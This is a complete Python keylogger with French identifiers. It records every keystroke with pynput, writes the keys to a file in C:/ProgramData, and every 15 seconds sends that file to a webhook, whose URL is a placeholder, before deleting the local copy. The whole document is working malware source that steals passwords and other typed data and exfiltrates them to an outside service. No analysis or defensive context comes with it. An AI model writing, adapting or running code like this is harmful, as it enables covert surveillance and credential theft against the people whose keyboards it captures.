from pynput import keyboard
from os import remove, getenv
from os.path import isfile
from threading import Thread
from dhooks import *
from time import sleep

lien = "WEBHOOK"



lien = Webhook(lien)

keys = {}

fichier = f"C:/ProgramData/keys.txt"

if isfile(fichier):
    try:
        remove(fichier)
    except:
        pass

def envoi_fichier():
    while True:
        if isfile(fichier):
            fichier_send = File(fichier)
            sleep(15)
            lien.send(file=fichier_send)
            try:
                remove(fichier)
            except:
                pass





for i in range(11):
    keys["<" + str(i + 96) + ">"] = str(i)


def on_press(key):
    key = str(key)

    if key in keys:
        key = keys[key]

    if key[0] == "'" and key[2] == "'":
        key = key[1]
    
    if key == "Key.ctrl_l":
        key = "ctrl"

    if key == "Key.caps_lock":
        key = "maj_lock"
    
    if key == "Key.shift":
        key = "shift"

    if key == "Key.enter":
        key = "enter"

    if key == "Key.space":
        key = "space"

    if key == "Key.backspace":
        key = "delete"

    if key == str(r"'\x03'"):
        key = "ctrl_c"
    
    if key == str(r"'\x16'"):
        key = "ctrl_v"

    if key == str(r"'\x13'"):
        key = "ctrl_s"

    if key == str(r"'\x06'"):
        key = "ctrl_f"

    if key == str(r"'\x08'"):
        key = "ctrl_h"

    with open(fichier, 'a') as f:
        f.write(key + "\n")
        f.close()
    
Thread(target=envoi_fichier).start()


with keyboard.Listener(on_press=on_press) as listener:
    listener.join()

